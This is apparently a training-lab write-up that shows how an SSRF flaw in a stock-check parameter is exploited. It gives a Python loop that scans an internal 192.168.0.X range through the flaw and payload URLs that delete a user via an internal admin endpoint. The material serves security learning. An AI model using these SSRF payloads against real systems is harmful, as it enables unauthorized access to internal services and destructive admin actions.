# Lab 2: Basic SSRF Against Another Back-End System

## Objective

The goal of this lab was to exploit an SSRF vulnerability in the stock check functionality to access an admin interface running on another internal system.

Unlike the previous lab, the admin interface was not hosted on `localhost`. I needed to discover its internal IP address within the `192.168.0.X` network, access port `8080`, and delete the user `carlos`.

## Analysis

1. **Identifying the SSRF entry point**

   The stock check functionality accepts a URL through the `stockApi` parameter and makes a server-side request to that address.

   This allows requests to internal systems that are not directly accessible from the external network.

2. **Scanning the internal network**

   The lab specified that the admin interface was somewhere in the `192.168.0.X` range and was listening on port `8080`.

   I automated the discovery process by iterating through addresses from `192.168.0.1` to `192.168.0.255` and requesting:

   ```text
   http://192.168.0.X:8080/admin
   ```

   Each request was sent through the stock check endpoint.

   The script used an HTTP status code of `200` as an indicator that the admin interface had been found.

3. **Identifying the admin server**

   The scan discovered the admin interface at:

   ```text
   http://192.168.0.52:8080/admin
   ```

   This confirmed that the vulnerable application server could communicate with another machine on its internal network.

4. **Deleting the user**

   After discovering the correct address, I changed the stock check URL to:

   ```text
   http://192.168.0.52:8080/admin/delete?username=carlos
   ```

   The application server then made the request to the internal admin endpoint.

## Exploitation

I automated the attack using Python and the `requests` library.

The script consists of two main stages:

**1. Internal network scanning**

The `CheckAdminHostname()` function iterates through the internal IP range:

```python id="a8k3pz"
for i in range(1, 256):
    hostname = 'http://192.168.0.%s:8080/admin' % i

    params = {
        "stockApi": hostname
    }

    r = requests.post(url + stockPath, data=params, proxies=proxies, verify=False)

    if r.status_code == 200:
        adminHostname = hostname
        break
```

When a request returns HTTP 200, the script records the address and stops scanning.

**2. Deleting the user**

The `Execute()` function sends the deletion request through the same stock check endpoint:

```python id="b4n6vz"
deleteRequest = adminIp + '/delete?username=carlos'

params = {
    'stockApi': deleteRequest
}
```

The script treats an HTTP 302 response as confirmation that the deletion action succeeded.

## Result

Successfully solved the lab by discovering the internal admin server at `192.168.0.52:8080` and using the SSRF vulnerability to delete the user `carlos`.

The vulnerability allowed the application server to act as a proxy into its internal network, exposing services that were not intended to be directly accessible from outside.